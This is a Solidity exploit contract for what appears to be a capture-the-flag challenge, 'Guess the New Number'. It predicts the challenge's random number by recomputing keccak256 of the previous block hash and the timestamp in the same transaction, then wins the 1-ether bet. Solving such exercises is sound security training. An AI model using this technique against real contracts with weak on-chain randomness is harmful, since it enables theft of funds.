// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.4.21;

import "./GuessTheNewNumberChallenge.sol";

// PRN games can be guessed by duplicating prng cod

contract Solution7 {
    GuessTheNewNumberChallenge public victim;

    function Solution7(GuessTheNewNumberChallenge victim_) public {
        victim = victim_;
    }

    function attack() external payable {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        victim.guess.value(1 ether)(answer);
    }

    //We need this to be able to handle payable(owner).transfer(address(this).balance);
    function() external payable {
    }
}
